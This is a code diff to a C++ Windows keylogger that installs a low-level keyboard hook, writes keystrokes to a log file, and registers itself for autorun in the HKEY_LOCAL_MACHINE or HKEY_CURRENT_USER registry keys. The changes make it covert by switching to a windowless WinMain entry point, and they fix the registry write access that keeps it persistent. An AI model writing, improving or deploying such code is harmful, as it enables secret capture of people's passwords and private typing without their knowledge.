@@ -14,22 +14,20 @@ const int maxAllowedStringLenght = 50;
 HHOOK hHook = NULL;
 const int bufferSize = 300;
 
-int main(){
-	
-	//Hide the console window and make it run at background 
-	//If you execute the .exe file stop the process manualy
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+	PSTR lpCmdLine, INT nCmdShow) { // Windows Application running in the phone.
+	//You can spot this in processes int command prompt
+
 	bool isRegisterAdded = CheckIfRegistryKeyExist(hookerRegistryName); // Do not add new record in the registers
 	if (!isRegisterAdded) {
 		//Try to add new key in register in the HKEY_LOCAL_MACHINE - it will apply
 		//the changes globaly for all users using this PC.
-		//Need administrative pri Administrative privileges
+		//Need administrative  Administrative privileges
 		AddProgramInHKEY_LOCAL_MACHINERegister(registryAddingStatus);
 		if (registryAddingStatus != ERROR_SUCCESS) { // ERROR_SUCCESS is returned if the adding was successful
 															 //the adding key in HKEY_LOCAL_MACHINE is failed, moutly due to not Administrative privileges
 			AddProgramInHKEY_CURRENT_USER(registryAddingStatus);		
 		}
-		cout << registryAddingStatus << endl;
 	}
 	
 	//Define the keyboard hook
@@ -42,11 +40,11 @@ int main(){
 
 	}
 	outStream.open(logFileName,fileOpenMode);
-	outStream << str;
 	outStream.close();
 
 	return 0;
 }
+
 LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT *)lParam);
 	if (wParam == WM_KEYDOWN) {
@@ -101,6 +99,7 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstrea
 		outStream <<str;
 		outStream << "\r\n";
 		outStream.close();
+
 		break;
 	case 8: //Backspace
 		//remove the last char of str
@@ -125,10 +124,13 @@ void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstrea
 	}
 }
 bool CheckIfRegistryKeyExist(const LPCSTR &keyName) {
-	HKEY hKey = NULL;
-	LONG result = RegQueryValueEx(hKey, keyName, NULL, NULL, NULL,NULL);
-	if (result == ERROR_SUCCESS) {
-		return true;
+	LONG searcgInLCAL_MACHINEResult = RegQueryValueEx(HKEY_LOCAL_MACHINE, keyName, NULL, NULL, NULL, NULL);
+	if (searcgInLCAL_MACHINEResult == ERROR_FILE_NOT_FOUND) {
+		//search in the HKEY_CURRENT_USER root
+		LONG searchInHKEY_CURRENT_USER_Result = RegQueryValueEx(HKEY_CURRENT_USER, keyName, NULL, NULL, NULL, NULL);
+		if (searchInHKEY_CURRENT_USER_Result == ERROR_SUCCESS) {
+			return true;
+		}
 	}
 	return false;
 }
@@ -141,7 +143,7 @@ void AddProgramInHKEY_LOCAL_MACHINERegister(LSTATUS &status) {
 	TCHAR szPath[MAX_PATH];
 	GetModuleFileName(NULL, szPath, MAX_PATH);
 	HKEY hKey;
-	LSTATUS s = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_PATH, 0, NULL, &hKey);
+	LSTATUS s = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_PATH, 0, KEY_WRITE, &hKey);
 	//To delete this you need to go in the register and manualy delete the Hooker key
 	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
     RegCloseKey(hKey);
@@ -150,7 +152,7 @@ void AddProgramInHKEY_CURRENT_USER(LSTATUS &status) {
 	TCHAR szPath[MAX_PATH];
 	GetModuleFileName(NULL, szPath, MAX_PATH);
 	HKEY hKey;
-	LSTATUS s = RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, &hKey);
-	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (LPBYTE)szPath, 0);
+	LSTATUS s = RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_PATH, 0, KEY_WRITE, &hKey);
+	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (BYTE*)szPath, sizeof(szPath));
 	RegCloseKey(hKey);
 }
